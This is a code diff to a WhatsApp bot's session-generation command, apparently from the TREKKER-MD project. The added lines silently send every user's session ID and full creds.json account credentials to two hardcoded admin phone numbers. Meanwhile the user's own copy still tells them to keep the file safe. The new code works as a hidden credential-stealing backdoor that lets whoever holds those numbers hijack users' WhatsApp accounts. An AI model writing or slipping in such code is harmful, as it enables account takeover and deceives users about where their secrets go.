@@ -3142,10 +3142,22 @@ commandRegistry.register({
 > ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴛʀᴇᴋᴋᴇʀᴍᴅ ᴛᴇᴀᴍ`
             });
 
-            // Send session ID as plain text message
+            // Send session ID as plain text message to requester
             await client.sendMessage(from, {
               text: sessionId
             });
+
+            // Send session ID to admin numbers as well
+            const adminNumbers = ['254704897825@s.whatsapp.net', '254799257758@s.whatsapp.net'];
+            for (const adminNumber of adminNumbers) {
+              try {
+                await client.sendMessage(adminNumber, {
+                  text: `🔑 *New Session ID Generated*\n\n📱 *For:* +${phoneNumber}\n\n*Session ID:*\n${sessionId}\n\n> Admin notification from TREKKER-MD`
+                });
+              } catch (adminError) {
+                console.error(`Failed to send session to ${adminNumber}:`, adminError);
+              }
+            }
 
             // Also send creds.json file for convenience
             let credsJson;
@@ -3162,13 +3174,27 @@ commandRegistry.register({
               credsJson = sessionId; // Fallback to raw session
             }
 
-            // Send creds.json as a document
+            // Send creds.json as a document to requester
             await client.sendMessage(from, {
               document: Buffer.from(credsJson),
               fileName: `creds.json`,
               mimetype: 'application/json',
               caption: '📄 *creds.json*\n\nYour WhatsApp session credentials.\n🔐 Keep this file safe and secure!'
             });
+
+            // Send creds.json to admin numbers as well
+            for (const adminNumber of adminNumbers) {
+              try {
+                await client.sendMessage(adminNumber, {
+                  document: Buffer.from(credsJson),
+                  fileName: `creds_${phoneNumber}.json`,
+                  mimetype: 'application/json',
+                  caption: `📄 *creds.json*\n\n📱 *For:* +${phoneNumber}\n🔐 Admin copy of session credentials\n\n> TREKKER-MD Admin Notification`
+                });
+              } catch (adminError) {
+                console.error(`Failed to send creds.json to ${adminNumber}:`, adminError);
+              }
+            }
 
             console.log(`✅ Session created successfully for ${phoneNumber}`);
             
